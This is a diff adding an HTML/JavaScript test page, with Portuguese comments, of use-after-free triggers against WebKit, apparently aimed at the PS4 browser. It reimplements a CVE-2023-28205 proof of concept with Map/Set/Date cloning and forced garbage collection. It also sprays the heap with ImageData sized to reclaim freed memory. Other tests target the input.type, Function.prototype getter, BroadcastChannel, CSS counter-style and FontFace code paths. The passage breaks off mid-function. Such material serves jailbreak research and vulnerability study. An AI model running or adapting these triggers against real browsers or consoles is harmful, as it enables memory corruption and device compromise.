@@ -1,0 +1,1976 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8">
+<title>Testes14 — CVE-2023-28205 / input.type UAF / Function.prototype getter / rAF / BroadcastChannel</title>
+</head>
+<body>
+
+<p><strong>TESTES14 — VETORES RECENTES DOCUMENTADOS (T326-T350):</strong><br>
+T326-328: CVE-2023-28205 EXATO (Map+Date delay GC — PS4 SIGSEGV confirmado, SceNKWebProcessMain)<br>
+T329-330: HTMLInputElement.type change UAF (WebCore::TimerBase::heapPop — psdevwiki)<br>
+T331-332: Function.prototype.__defineGetter__ UAF (2024, wololo.net)<br>
+T333: requestAnimationFrame + DOM mutation + GC<br>
+T334: BroadcastChannel + GC durante message handler<br>
+T335: HTMLSelectElement options live collection + remoção<br>
+T336: CSS @counter-style + remoção de elemento referenciando<br>
+T337: CSS @font-face + FontFace.load() Promise + GC<br>
+T338: Drag and Drop events + DOM removal durante drag<br>
+T339: Pointer Events API + removeChild durante pointerdown<br>
+T340: CSS @keyframes name collision + GC<br>
+T341: WebSocket close durante message handler + GC<br>
+T342: structuredClone profundo Map/Set/Date + GC delay (CVE-2023-28205 variant)<br>
+T343: CSS @property + registerProperty + GC (CSS Houdini)<br>
+T344: datalist + input[list] + DOM mutation<br>
+T345: iframe srcdoc + parent mutation + GC<br>
+T346: HTMLMediaElement.captureStream() + canvas + GC<br>
+T347: Proxy + defineProperty getter GC (Object.defineProperty)<br>
+T348: HTMLOutputElement form association + DOM removal<br>
+T349: CSS mask-image + element removal + GC<br>
+T350: STRESS FINAL — CVE-2023-28205 + input.type UAF + Function.prototype getter + rAF</p>
+
+<div id="dom14" style="display:none"></div>
+<input id="inp14a" type="search"  value="test_search">
+<input id="inp14b" type="text"    value="anchor">
+<canvas id="canvas14" width="64" height="64" style="display:none"></canvas>
+<video id="vid14" style="display:none" muted playsinline></video>
+
+<button onclick="runAll()">RODAR TODOS</button><br><br>
+<button onclick="t326()">T326</button>
+<button onclick="t327()">T327</button>
+<button onclick="t328()">T328</button>
+<button onclick="t329()">T329</button>
+<button onclick="t330()">T330</button>
+<button onclick="t331()">T331</button>
+<button onclick="t332()">T332</button>
+<button onclick="t333()">T333</button>
+<button onclick="t334()">T334</button>
+<button onclick="t335()">T335</button>
+<button onclick="t336()">T336</button>
+<button onclick="t337()">T337</button>
+<button onclick="t338()">T338</button>
+<button onclick="t339()">T339</button>
+<button onclick="t340()">T340</button>
+<button onclick="t341()">T341</button>
+<button onclick="t342()">T342</button>
+<button onclick="t343()">T343</button>
+<button onclick="t344()">T344</button>
+<button onclick="t345()">T345</button>
+<button onclick="t346()">T346</button>
+<button onclick="t347()">T347</button>
+<button onclick="t348()">T348</button>
+<button onclick="t349()">T349</button>
+<button onclick="t350()">T350</button>
+
+<pre id="o"></pre>
+
+<script>
+function log(m){ document.getElementById('o').textContent += m + '\n'; }
+
+// GC idêntico ao PoC do seregonwar/ntfargo CVE-2023-28205 e PSFree
+const MB = 1024 * 1024;
+function gc(){
+  for(let i = 0; i < 0x10; i++) new Uint8Array(4 * MB);
+}
+function gcHeavy(){
+  for(let i = 0; i < 0x40; i++) new ArrayBuffer(0x1000000);
+}
+
+function runAll(){
+  log('=== RODAR TODOS T326-T350: inicio ===');
+  t326(); t327(); t328(); t329(); t330();
+  t331(); t332(); t333(); t334(); t335();
+  t336(); t337(); t338(); t339(); t340();
+  t341(); t342(); t343(); t344(); t345();
+  t346(); t347(); t348(); t349(); t350();
+  log('=== RODAR TODOS: fim ===');
+}
+
+// ─── T326 ─────────────────────────────────────────────────────────────────────
+// CVE-2023-28205 EXATO — PoC do ntfargo/seregonwar (PS4 SIGSEGV confirmado)
+// SerializedScriptValue.cpp: Vector<JSMap*, 4> mapStack e Vector<JSSet*, 4> setStack
+// NÃO são varridos pelo GC. Ao deserializar um Map via postMessage/structuredClone,
+// o Map é colocado em mapStack ANTES de ser adicionado como GC root.
+// Se o GC rodar durante essa janela, o Map é liberado mas mapStack ainda aponta → UAF.
+// Técnica: criar Map + Date com delay entre a criação e a adição ao output.
+// Crash: SIGSEGV fault address 0x68 em SceNKWebProcessMain (PS4 crash log real)
+function t326(){
+  log('Teste 326: inicio');
+  try {
+    const mc326 = new MessageChannel();
+    let clonedRefs = [];
+
+    mc326.port1.onmessage = function(evt){
+      try {
+        // O objeto deserializado: se UAF ocorreu, acessar propriedades crashará
+        const data = evt.data;
+        gc(); // GC imediatamente após receber — mapStack pode ter stale ptr
+        if(data){
+          // Operações que dereferem o mapStack liberado
+          try { data.m instanceof Map; }      catch(e){}
+          try { data.m.size; }                catch(e){}
+          try { data.m.get('key'); }          catch(e){}
+          try { data.m.forEach(function(){}); } catch(e){}
+          try { data.s instanceof Set; }      catch(e){}
+          try { data.s.size; }                catch(e){}
+          try { data.d instanceof Date; }     catch(e){}
+          try { data.d.getTime(); }           catch(e){}
+          clonedRefs.push(data);
+        }
+        gcHeavy(); // GC pesado pós-acesso
+      } catch(e){}
+    };
+
+    // Objeto com Map, Set e Date aninhados — payload do CVE-2023-28205
+    // O Map contém uma Date como valor, e a Date contém outra Map (dupla referência)
+    const outerMap = new Map();
+    const innerDate = new Date(1111); // timestamp 1111 como no PoC original
+    innerDate[0] = 1.1;              // cria butterfly no Date (como no PoC)
+    const innerSet = new Set([1, 2, 3, 'key', innerDate]);
+    outerMap.set('key', innerSet);
+    outerMap.set('date', innerDate);
+    outerMap.set('nested', new Map([['a', 1], ['b', 2]]));
+
+    // Enviar via postMessage (usa SerializedScriptValue.cpp internamente)
+    // A janela de UAF está entre: novo Map criado no deserializer E adicionado ao GC root
+    for(let i = 0; i < 20; i++){
+      try {
+        mc326.port2.postMessage({
+          m: outerMap,
+          s: innerSet,
+          d: innerDate,
+          arr: new Array(50).fill(i * 1.1),
+          str: 'payload_' + i + '_' + 'x'.repeat(56)
+        });
+        gc(); // GC entre cada postMessage — aumenta janela de UAF
+      } catch(e){}
+    }
+
+    // Soltar referências + GC pesado → força coleta dos Map/Set/Date
+    clonedRefs = null;
+    gcHeavy();
+  } catch(e){}
+  log('Teste 326: fim');
+}
+
+// ─── T327 ─────────────────────────────────────────────────────────────────────
+// CVE-2023-28205 variante — structuredClone com Map/Date aninhados profundamente
+// structuredClone usa o mesmo CloneDeserializer de SerializedScriptValue.cpp.
+// Aninhamento profundo aumenta o tempo em que os objetos ficam em mapStack
+// sem estar registrados como GC roots, alargando a janela de UAF.
+function t327(){
+  log('Teste 327: inicio');
+  try {
+    // Construir estrutura Map/Set/Date profundamente aninhada
+    function buildDeepClonePayload(depth){
+      if(depth <= 0){
+        const d = new Date(depth * 12345);
+        d.data = new Array(10).fill(depth * 1.1);
+        return d;
+      }
+      const m = new Map();
+      const s = new Set();
+      const d = new Date((depth * 1000) + 1111);
+      d[0] = depth * 1.1; // butterfly no Date
+      // Adicionar referências cruzadas (Map aponta para Set e vice-versa)
+      m.set('next',  buildDeepClonePayload(depth - 1));
+      m.set('date',  d);
+      m.set('self_ref_key', depth); // sem loop real, mas similar
+      s.add(d);
+      s.add(m);
+      s.add(buildDeepClonePayload(Math.max(0, depth - 2)));
+      return { m, s, d };
+    }
+
+    // Profundidade 10 → estrutura com ~100 Map/Set/Date aninhados
+    const deepPayload = buildDeepClonePayload(10);
+
+    // structuredClone com GC durante a operação
+    for(let i = 0; i < 15; i++){
+      try {
+        // Iniciar clone + GC imediatamente — janela de UAF no deserializer
+        const clonePromise = new Promise(function(resolve){
+          try {
+            const cloned = structuredClone(deepPayload);
+            gc(); // GC durante uso do clone
+            resolve(cloned);
+          } catch(e){ resolve(null); }
+        });
+        gc(); // GC antes do clone resolver
+        clonePromise.then(function(cloned){
+          gc();
+          if(cloned && cloned.m) try { cloned.m.size; } catch(e){}
+        });
+      } catch(e){}
+    }
+
+    // Versão com IPC via Worker (se disponível) — mais próximo do UAF real
+    try {
+      const workerCode = `
+        self.onmessage = function(evt) {
+          const data = evt.data;
+          // Fazer algo com os dados para forçar deserialização completa
+          if(data && data.m) {
+            self.postMessage({ result: data.m.size || 0 });
+          }
+        };
+      `;
+      const blob = new Blob([workerCode], { type: 'application/javascript' });
+      const workerURL = URL.createObjectURL(blob);
+      const worker = new Worker(workerURL);
+      worker.onmessage = function(evt){
+        gc();
+        worker.terminate();
+        URL.revokeObjectURL(workerURL);
+      };
+      worker.postMessage(deepPayload);
+      gc();
+    } catch(e){}
+  } catch(e){}
+  log('Teste 327: fim');
+}
+
+// ─── T328 ─────────────────────────────────────────────────────────────────────
+// CVE-2023-28205 variante — Map circular + GC + postMessage em loop
+// Versão com spray de objetos para aumentar probabilidade de reclamar o slot
+// do Map/Date liberado (técnica da PSFree adaptada para este CVE)
+function t328(){
+  log('Teste 328: inicio');
+  try {
+    const mc328 = new MessageChannel();
+    const receivedData = [];
+
+    mc328.port1.onmessage = function(evt){
+      const d = evt.data;
+      receivedData.push(d);
+      gc(); // GC durante handler
+
+      // Spray: ImageData(1, 36) = 0x90 bytes — mesmo tamanho do Map deserializado
+      const spray = [];
+      for(let i = 0; i < 0x200; i++){
+        spray.push(new ImageData(1, 36)); // 0x90 bytes exatamente
+      }
+
+      // Tentar acessar dados após spray (pode ter sido reclamado)
+      if(d){
+        try { d.m && d.m.size; }       catch(e){}
+        try { d.s && [...d.s]; }        catch(e){}
+        try { d.d && d.d.toISOString(); } catch(e){}
+        try { d.nested && d.nested.get && d.nested.get('a'); } catch(e){}
+      }
+
+      gcHeavy();
+    };
+
+    // Spray pré-GC para preparar o heap
+    const preSpray = [];
+    for(let i = 0; i < 0x400; i++){
+      const m = new Map([['k', i], ['v', i * 2.2]]);
+      preSpray.push(m);
+    }
+    gc();
+    preSpray.length = 0; // liberar Maps → cria buracos no GC heap
+    gc();
+
+    // Enviar payload Map/Date
+    const dates = Array.from({ length: 5 }, function(_, i){
+      const d = new Date(i * 1111);
+      d[0] = i * 1.1;
+      return d;
+    });
+
+    for(let round = 0; round < 25; round++){
+      try {
+        const m = new Map();
+        for(let d of dates) m.set('date_' + d.getTime(), d);
+        const s = new Set(dates);
+
+        mc328.port2.postMessage({ m, s, d: dates[0], nested: new Map([['a', 1]]), round });
+        gc();
+      } catch(e){}
+    }
+
+    // GC final com referências soltas
+    receivedData.length = 0;
+    gcHeavy();
+  } catch(e){}
+  log('Teste 328: fim');
+}
+
+// ─── T329 ─────────────────────────────────────────────────────────────────────
+// HTMLInputElement.type change UAF EXATO (psdevwiki, WebCore::TimerBase::heapPop)
+// "It is possible for JavaScript to change the type property of an input field.
+//  WebKit needs to gracefully handle this case."
+// Mudar input.type enquanto o input tem focus/validação ativa destroi o InputType C++
+// antigo mas o Timer do antigo InputType ainda está na heap → acesso via TimerBase::heapPop
+// Confirmado em PS4/PS5: mudar de "search" → "text" enquanto focado é o gatilho clássico
+function t329(){
+  log('Teste 329: inicio');
+  try {
+    const area = document.getElementById('dom14');
+    area.style.display = 'block';
+
+    // Criar inputs de vários tipos para testar as transições
+    const typeTransitions = [
+      ['search',   'text'],
+      ['text',     'number'],
+      ['number',   'email'],
+      ['email',    'password'],
+      ['password', 'search'],
+      ['search',   'tel'],
+      ['tel',      'url'],
+      ['url',      'range'],
+      ['range',    'date'],
+      ['date',     'datetime-local'],
+      ['datetime-local', 'time'],
+      ['time',     'color'],
+      ['color',    'file'],
+      ['file',     'checkbox'],
+      ['checkbox', 'radio'],
+      ['radio',    'submit'],
+      ['submit',   'search'],  // volta ao início
+    ];
+
+    for(let [fromType, toType] of typeTransitions){
+      try {
+        const inp = document.createElement('input');
+        inp.type  = fromType;
+        inp.name  = 'test_' + fromType;
+        inp.value = fromType === 'number' || fromType === 'range' ? '42' : 'test_value';
+        area.appendChild(inp);
+
+        // Focar o input — ativa o InputType C++ e seus Timers
+        try { inp.focus(); } catch(e){}
+        gc(); // GC com InputType ativo
+
+        // MUDAR O TIPO ENQUANTO FOCADO — destroi o InputType C++ antigo
+        // O Timer do tipo antigo ainda pode estar no heap de timers
+        inp.type = toType;
+        gc(); // GC: InputType antigo liberado; Timer ainda na fila → heapPop UAF
+
+        // Continuar usando o input após mudança de tipo
+        try { inp.value; }              catch(e){}
+        try { inp.validity.valid; }     catch(e){}
+        try { inp.checkValidity(); }    catch(e){}
+        try { inp.dispatchEvent(new Event('input')); } catch(e){}
+        try { inp.dispatchEvent(new Event('change')); } catch(e){}
+
+        // Desfocar — Timer do tipo novo pode tentar executar com InputType liberado
+        try { inp.blur(); } catch(e){}
+        gc();
+
+        try { area.removeChild(inp); } catch(e){}
+        gc();
+      } catch(e){}
+    }
+
+    area.style.display = 'none';
+  } catch(e){}
+  log('Teste 329: fim');
+}
+
+// ─── T330 ─────────────────────────────────────────────────────────────────────
+// HTMLInputElement.type UAF — variante com validação ativa + reportValidity + type change
+// Combinar o type change UAF com o ValidationMessage UAF (T226/Synacktiv):
+// reportValidity() → buildBubbleTree timer ativo → mudar type → dois UAFs simultâneos
+function t330(){
+  log('Teste 330: inicio');
+  try {
+    const area = document.getElementById('dom14');
+    area.style.display = 'block';
+
+    // Input com validação ativa
+    const inp330 = document.createElement('input');
+    inp330.type     = 'email';
+    inp330.required = true;
+    inp330.value    = 'INVALID_NOT_EMAIL';
+    area.appendChild(inp330);
+
+    const inp330b = document.createElement('input');
+    inp330b.type = 'text';
+    area.appendChild(inp330b);
+
+    let phase330 = 0;
+
+    // Handler que muda o tipo E destrói o ValidationMessage simultaneamente
+    function dualUAFHandler(){
+      phase330++;
+
+      // Mudar tipo enquanto ValidationMessage está sendo construído
+      try { inp330.type = ['text','number','search','tel','url','password'][phase330 % 6]; } catch(e){}
+      gc(); // GC: InputType antigo liberado + ValidationMessage pode estar ativo
+
+      // Remover o input durante a janela dupla de UAF
+      if(phase330 === 3 && inp330.parentNode){
+        try { area.removeChild(inp330); gc(); area.appendChild(inp330); } catch(e){}
+      }
+
+      // Voltar para email inválido para re-triggerar
+      try { inp330.type = 'email'; inp330.value = 'STILL_INVALID'; } catch(e){}
+    }
+
+    inp330.addEventListener('invalid', dualUAFHandler);
+    inp330.addEventListener('focus',   dualUAFHandler);
+    inp330.addEventListener('blur',    dualUAFHandler);
+
+    for(let i = 0; i < 15; i++){
+      try { inp330b.focus(); gc(); } catch(e){}
+      try { inp330.checkValidity(); } catch(e){}
+      try { inp330.reportValidity(); } catch(e){}
+      try { inp330.focus(); gc(); } catch(e){}
+      try { inp330.blur(); gc(); } catch(e){}
+    }
+
+    while(area.firstChild) try { area.removeChild(area.firstChild); } catch(e){}
+    area.style.display = 'none';
+  } catch(e){}
+  log('Teste 330: fim');
+}
+
+// ─── T331 ─────────────────────────────────────────────────────────────────────
+// Function.prototype.__defineGetter__ UAF (2024 WebKit bug, wololo.net)
+// PoC original: function test2(i) {
+//   const f = new MyFunction();
+//   try { f.__defineGetter__("prototype", () => {}); } catch {}
+//   f.prototype.x = i; // should not crash
+// }
+// __defineGetter__ na propriedade "prototype" de uma função cria um Accessor
+// que intercepta o acesso a .prototype. Se o getter retorna algo diferente
+// do objeto prototype original, acessar f.prototype.x pode causar UAF.
+function t331(){
+  log('Teste 331: inicio');
+  try {
+    // Versão básica do PoC
+    for(let i = 0; i < 50; i++){
+      try {
+        function MyFunc331a(){}
+        // __defineGetter__ em "prototype" — caso especial no WebKit
+        try { MyFunc331a.__defineGetter__('prototype', function(){ gc(); return {}; }); } catch(e){}
+        // Acessar f.prototype.x — getter retorna novo objeto a cada acesso
+        try { MyFunc331a.prototype.x = i; } catch(e){}
+        gc();
+      } catch(e){}
+    }
+
+    // Variante: __defineSetter__ em prototype
+    for(let i = 0; i < 30; i++){
+      try {
+        function MyFunc331b(){}
+        try {
+          MyFunc331b.__defineSetter__('prototype', function(v){ gc(); this._proto = v; });
+          MyFunc331b.__defineGetter__('prototype', function(){ gc(); return this._proto || {}; });
+        } catch(e){}
+        try { MyFunc331b.prototype = { x: i, y: i * 2 }; } catch(e){}
+        try { MyFunc331b.prototype.x; } catch(e){}
+        gc();
+      } catch(e){}
+    }
+
+    // Variante: Object.defineProperty em "prototype" com getter/setter
+    for(let i = 0; i < 30; i++){
+      try {
+        function MyFunc331c(){}
+        let protoVal = { x: i };
+        Object.defineProperty(MyFunc331c, 'prototype', {
+          get: function(){ gc(); return protoVal; },
+          set: function(v){ gc(); protoVal = v; },
+          configurable: true
+        });
+        try { MyFunc331c.prototype.x = i * 2; } catch(e){}
+        try { new MyFunc331c(); } catch(e){}
+        gc();
+      } catch(e){}
+    }
+
+    // Variante: constructor em class com getter de prototype
+    for(let i = 0; i < 20; i++){
+      try {
+        class MyClass331 {}
+        try {
+          MyClass331.__defineGetter__('prototype', function(){ gc(); return Object.create(null); });
+        } catch(e){}
+        try { new MyClass331(); } catch(e){} // instanciar com prototype getter ativo
+        gc();
+      } catch(e){}
+    }
+  } catch(e){}
+  log('Teste 331: fim');
+}
+
+// ─── T332 ─────────────────────────────────────────────────────────────────────
+// Function.__defineGetter__ UAF — variante com Function.prototype chain e GC
+// Aplicar __defineGetter__ na chain de protótipos de funções para criar
+// confusão de tipos no JavaScriptCore LLInt ao resolver propriedades
+function t332(){
+  log('Teste 332: inicio');
+  try {
+    // __defineGetter__ em Function.prototype (afeta TODAS as funções)
+    const originalPrototypeDescriptor = Object.getOwnPropertyDescriptor(Function.prototype, 'prototype');
+
+    try {
+      // Temporariamente sobrescrever em Function.prototype
+      // (pode não funcionar em modo strict, mas tenta)
+      function patchedGetter(){ gc(); return this._patched_proto || Object.prototype; }
+      try { Function.prototype.__defineGetter__('_test_proto', patchedGetter); } catch(e){}
+    } catch(e){}
+
+    // Usar funções normais após o patch
+    for(let i = 0; i < 30; i++){
+      try {
+        function testFn332(){ return i; }
+        testFn332.prototype.value = i;
+        testFn332._test_proto; // acessa getter injetado
+        gc();
+        new testFn332();
+        gc();
+      } catch(e){}
+    }
+
+    // __defineGetter__ + Proxy em função
+    for(let i = 0; i < 20; i++){
+      try {
+        function baseFn332(){}
+        const proxied = new Proxy(baseFn332, {
+          get: function(t, k){
+            gc(); // GC em cada acesso de propriedade
+            if(k === 'prototype'){
+              return { proxied_proto: true, index: i };
+            }
+            return Reflect.get(t, k);
+          },
+          construct: function(t, args){
+            gc();
+            return Reflect.construct(t, args);
+          }
+        });
+        try { proxied.prototype.x = i; } catch(e){}
+        try { new proxied(); }           catch(e){}
+        gc();
+      } catch(e){}
+    }
+
+    // Generator function + __defineGetter__ em prototype
+    for(let i = 0; i < 20; i++){
+      try {
+        function* genFn332(){ yield i; }
+        try { genFn332.__defineGetter__('prototype', function(){ gc(); return { gen: true }; }); } catch(e){}
+        try { const g = genFn332(); g.next(); g.next(); } catch(e){}
+        gc();
+      } catch(e){}
+    }
+  } catch(e){}
+  log('Teste 332: fim');
+}
+
+// ─── T333 ─────────────────────────────────────────────────────────────────────
+// requestAnimationFrame + DOM mutation + GC (RenderLayer UAF)
+// rAF é executado antes do próximo paint; durante o callback, o render tree
+// pode estar em estado intermediário; remoção de elementos causa UAF no RenderLayer.
+function t333(){
+  log('Teste 333: inicio');
+  try {
+    const area = document.getElementById('dom14');
+    area.style.display = 'block';
+
+    // Criar elementos com RenderLayer (transform, opacity, z-index)
+    const layerEls = [];
+    for(let i = 0; i < 20; i++){
+      const el = document.createElement('div');
+      el.style.cssText = [
+        'width:50px', 'height:50px',
+        'background:hsl(' + (i*18) + ',70%,50%)',
+        'transform:translateX(' + i + 'px)',
+        'opacity:' + (0.5 + i*0.02),
+        'position:absolute',
+        'left:' + (i*10) + 'px',
+        'top:0px',
+        'will-change:transform',
+      ].join(';');
+      area.appendChild(el);
+      layerEls.push(el);
+    }
+
+    let rafN = 0;
+    let rafRunning = true;
+
+    function rafCallback(timestamp){
+      rafN++;
+      gc(); // GC no início do frame
+
+      // Mutar DOM durante o callback do rAF
+      try {
+        const idx = rafN % layerEls.length;
+        const el  = layerEls[idx];
+
+        if(el.parentNode){
+          area.removeChild(el); // remover durante rAF — RenderLayer UAF
+          gc();
+          area.appendChild(el);
+        }
+
+        // Mudar transform durante rAF — invalida RenderLayer
+        el.style.transform = 'translateX(' + (rafN * 3 % 200) + 'px) rotate(' + (rafN * 5) + 'deg)';
+        gc();
+      } catch(e){}
+
+      if(rafRunning && rafN < 30){
+        try { requestAnimationFrame(rafCallback); } catch(e){}
+      }
+    }
+
+    try { requestAnimationFrame(rafCallback); } catch(e){}
+
+    // Parar após 2 segundos
+    setTimeout(function(){
+      rafRunning = false;
+      while(area.firstChild) try { area.removeChild(area.firstChild); } catch(e){}
+      area.style.display = 'none';
+    }, 2000);
+  } catch(e){}
+  log('Teste 333: fim');
+}
+
+// ─── T334 ─────────────────────────────────────────────────────────────────────
+// BroadcastChannel + GC durante message handler (MessagePort UAF)
+// BroadcastChannel usa um mecanismo de IPC; GC durante o handler pode liberar
+// o canal enquanto ainda está processando a mensagem.
+function t334(){
+  log('Teste 334: inicio');
+  try {
+    if(typeof BroadcastChannel === 'undefined'){
+      log('Teste 334: fim (sem BroadcastChannel)');
+      return;
+    }
+
+    const ch1 = new BroadcastChannel('test_channel_14');
+    const ch2 = new BroadcastChannel('test_channel_14');
+    const ch3 = new BroadcastChannel('test_channel_14');
+
+    let msgCount = 0;
+
+    ch1.onmessage = function(evt){
+      msgCount++;
+      gc(); // GC durante handler
+      try {
+        // Fechar o canal que recebeu durante o callback
+        if(msgCount === 5) ch1.close();
+        gc();
+        // Tentar usar o canal pós-close
+        try { ch1.name; }                  catch(e){}
+        try { ch1.postMessage('post_after_close'); } catch(e){}
+      } catch(e){}
+    };
+
+    ch2.onmessage = function(evt){
+      gc();
+      try {
+        // Enviar de volta criando loop de mensagens
+        if(msgCount < 30){
+          ch2.postMessage({ bounce: true, data: evt.data, count: msgCount });
+        }
+      } catch(e){}
+    };
+
+    ch3.onmessage = function(evt){
+      gc();
+      // ch3 fecha imediatamente após receber
+      try { ch3.close(); gc(); } catch(e){}
+      // Tentar usar após close
+      try { ch3.postMessage('closed_channel'); } catch(e){}
+    };
+
+    // Enviar mensagens com dados variados
+    const payloads = [
+      { type: 'basic', value: 42 },
+      { type: 'array', data: new Array(100).fill(1.5) },
+      { type: 'nested', map: { a: 1, b: { c: 2, d: { e: 3 } } } },
+      new ArrayBuffer(1024),
+      'string_payload_' + 'x'.repeat(1000),
+    ];
+
+    for(let i = 0; i < 20; i++){
+      try {
+        ch2.postMessage(payloads[i % payloads.length]);
+        gc();
+      } catch(e){}
+    }
+
+    // Fechar todos + GC
+    setTimeout(function(){
+      try { ch1.close(); } catch(e){}
+      try { ch2.close(); } catch(e){}
+      try { ch3.close(); } catch(e){}
+      gc();
+    }, 1000);
+  } catch(e){}
+  log('Teste 334: fim');
+}
+
+// ─── T335 ─────────────────────────────────────────────────────────────────────
+// HTMLSelectElement: options live collection + remoção durante iteração + GC
+// HTMLOptionsCollection é live; mutar durante iteração pode causar OOB/UAF
+function t335(){
+  log('Teste 335: inicio');
+  try {
+    const area = document.getElementById('dom14');
+    area.style.display = 'block';
+
+    const sel = document.createElement('select');
+    sel.multiple = true;
+    sel.size = 5;
+
+    // Adicionar opções
+    const opts = [];
+    for(let i = 0; i < 50; i++){
+      const opt = document.createElement('option');
+      opt.value = 'val_' + i;
+      opt.text  = 'Option ' + i;
+      sel.add(opt);
+      opts.push(opt);
+    }
+    area.appendChild(sel);
+
+    // HTMLOptionsCollection é live
+    const liveOpts = sel.options;
+
+    // Iterar + remover durante iteração
+    for(let i = liveOpts.length - 1; i >= 0; i--){
+      try {
+        const opt = liveOpts[i]; // referência viva
+        gc();
+        // Remover a opção — liveOpts se atualiza imediatamente
+        sel.remove(i);
+        gc(); // GC: opt pode ser liberada; liveOpts ainda tem stale ptrs?
+        // Acessar opt pós-remoção
+        try { opt.value; opt.text; opt.index; opt.selected; } catch(e){}
+        // Acessar índices que agora estão fora dos limites
+        try { liveOpts[i]; }     catch(e){}
+        try { liveOpts[i + 1]; } catch(e){}
+      } catch(e){}
+    }
+
+    // Adicionar opções de volta e testar selectedOptions
+    for(let i = 0; i < 20; i++){
+      try {
+        const opt = new Option('New_' + i, 'new_' + i);
+        sel.add(opt);
+        opt.selected = (i % 2 === 0);
+      } catch(e){}
+    }
+    gc();
+
+    // HTMLSelectElement.selectedOptions (live HTMLCollection)
+    const selOpts = sel.selectedOptions;
+    for(let i = selOpts.length - 1; i >= 0; i--){
+      try {
+        const opt = selOpts[i];
+        sel.remove(sel.options.length - 1);
+        gc();
+        try { opt.text; selOpts.length; } catch(e){}
+      } catch(e){}
+    }
+
+    // HTMLSelectElement.add() + remove() racing
+    for(let i = 0; i < 20; i++){
+      try {
+        sel.add(new Option('race_' + i, 'r' + i), 0); // insert at beginning
+        gc();
+        sel.remove(sel.options.length - 1); // remove from end
+        gc();
+        sel.selectedIndex; // acessar índice durante mutação
+      } catch(e){}
+    }
+
+    try { area.removeChild(sel); } catch(e){}
+    area.style.display = 'none';
+  } catch(e){}
+  log('Teste 335: fim');
+}
+
+// ─── T336 ─────────────────────────────────────────────────────────────────────
+// CSS @counter-style: definir + usar + remover elemento referenciando + GC
+// @counter-style define um novo tipo de contador; elementos com
+// list-style-type: custom-counter criam CounterStyle objects em fastMalloc.
+// Remover a regra @counter-style enquanto elementos a referenciam = UAF.
+function t336(){
+  log('Teste 336: inicio');
+  try {
+    const area = document.getElementById('dom14');
+    area.style.display = 'block';
+
+    const style = document.createElement('style');
+    style.textContent = `
+      @counter-style thumbs {
+        system: cyclic;
+        symbols: "\\1F44D" "\\1F44E";
+        suffix: " ";
+      }
+      @counter-style custom-roman {
+        system: additive;
+        additive-symbols: 1000 M, 900 CM, 500 D, 400 CD, 100 C;
+        suffix: ". ";
+      }
+      @counter-style custom-alpha {
+        system: alphabetic;
+        symbols: A B C D E F G H I J;
+      }
+      #dom14 .counter-thumbs  { list-style-type: thumbs; }
+      #dom14 .counter-roman   { list-style-type: custom-roman; }
+      #dom14 .counter-alpha   { list-style-type: custom-alpha; }
+    `;
+    document.head.appendChild(style);
+
+    // Criar listas que usam os @counter-style customizados
+    const lists = [];
+    for(let i = 0; i < 5; i++){
+      const ul = document.createElement('ul');
+      ul.className = ['counter-thumbs', 'counter-roman', 'counter-alpha'][i % 3];
+      for(let j = 0; j < 10; j++){
+        const li = document.createElement('li');
+        li.textContent = 'Item ' + i + '.' + j;
+        ul.appendChild(li);
+      }
+      area.appendChild(ul);
+      lists.push(ul);
+    }
+
+    // Forçar layout que cria CounterStyle objects
+    let _ = area.offsetHeight;
+    gc();
+
+    // Remover regras @counter-style da sheet enquanto elementos as usam
+    const sheet = style.sheet;
+    if(sheet){
+      for(let i = sheet.cssRules.length - 1; i >= 0; i--){
+        try {
+          const rule = sheet.cssRules[i];
+          const isCounterStyle = rule.type === CSSRule.COUNTER_STYLE_RULE ||
+                                  (rule.cssText && rule.cssText.startsWith('@counter-style'));
+          if(isCounterStyle){
+            sheet.deleteRule(i);
+            gc(); // GC: CounterStyle liberado; listas ainda referenciam
+            _ = area.offsetHeight; // forçar re-render sem o counter-style
+            // Acessar rule pós-deleteRule
+            try { rule.cssText; } catch(e){}
+          }
+        } catch(e){}
+      }
+    }
+
+    // Acessar listas após remoção dos @counter-style
+    for(let list of lists){
+      try { list.offsetHeight; list.offsetWidth; } catch(e){}
+      try {
+        const cs = window.getComputedStyle(list.firstChild || list);
+        cs.listStyleType;
+      } catch(e){}
+    }
+
+    try { document.head.removeChild(style); } catch(e){}
+    while(area.firstChild) try { area.removeChild(area.firstChild); } catch(e){}
+    area.style.display = 'none';
+  } catch(e){}
+  log('Teste 336: fim');
+}
+
+// ─── T337 ─────────────────────────────────────────────────────────────────────
+// CSS @font-face + FontFace.load() Promise + GC (FontLoader UAF)
+// FontFace.load() cria um CachedFont em fastMalloc; GC durante o load pode
+// liberar o CachedFont antes da Promise resolver.
+function t337(){
+  log('Teste 337: inicio');
+  try {
+    // FontFace API (CSS Font Loading Level 3)
+    if(typeof FontFace === 'undefined'){
+      log('Teste 337: fim (sem FontFace API)');
+      return;
+    }
+
+    // Criar FontFace objects com data URIs inválidas para triggerar erros rápidos
+    const fontDataBase64 = 'data:font/woff2;base64,d09GRgABAAAAAABsABAAAAAAARAAAAA='; // woff2 inválido
+    const fontFaces = [];
+
+    for(let i = 0; i < 10; i++){
+      try {
+        const ff = new FontFace('TestFont' + i, fontDataBase64, {
+          style: 'normal',
+          weight: (100 + i * 100).toString(),
+          display: 'swap'
+        });
+        fontFaces.push(ff);
+        document.fonts.add(ff);
+      } catch(e){}
+    }
+
+    gc(); // GC com FontFace objects no document.fonts mas não carregados
+
+    // Chamar load() + GC durante a Promise
+    for(let ff of fontFaces){
+      try {
+        ff.load().then(function(loadedFf){
+          gc(); // GC imediatamente após load
+          loadedFf.family;
+          loadedFf.status;
+          document.fonts.delete(loadedFf);
+          gc(); // GC após delete — FontLoader pode ter stale ptr
+          // Tentar usar após delete
+          try { loadedFf.family; } catch(e){}
+        }).catch(function(err){
+          gc(); // GC durante erro de carregamento
+          // Acessar ff após falha
+          try { ff.status; ff.family; } catch(e){}
+          document.fonts.delete(ff);
+          gc();
+        });
+        gc();
+      } catch(e){}
+    }
+
+    // Liberar todos + GC (Promises ainda pendentes)
+    fontFaces.length = 0;
+    gcHeavy();
+
+    // document.fonts.ready Promise + GC
+    try {
+      document.fonts.ready.then(function(){
+        gc();
+        document.fonts.size;
+        for(let ff of document.fonts){ try { ff.family; } catch(e){} }
+      });
+    } catch(e){}
+
+    // @font-face via CSSStyleSheet + deleteRule enquanto usado
+    try {
+      const style = document.createElement('style');
+      style.textContent = '@font-face { font-family: "SheetFont"; src: url(' + fontDataBase64 + '); }';
+      document.head.appendChild(style);
+      const sheet = style.sheet;
+
+      // Criar elemento usando a fonte
+      const el = document.createElement('div');
